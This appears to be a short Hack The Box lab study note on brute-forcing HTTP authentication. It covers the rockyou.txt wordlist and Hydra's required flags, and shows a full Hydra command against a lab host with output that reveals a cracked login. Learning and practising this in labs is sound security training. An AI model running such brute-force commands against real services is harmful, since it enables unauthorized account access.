One of the most commonly used password wordlists is `rockyou.txt`
* unless a password is truly unique, this wordlist will likely contain it.


`Hydra` requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:

1. `Credentials`
2. `Target Host`
3. `Target Path`

```shell-session
canklesmaks@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking http-get://178.35.49.134:32901/

[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```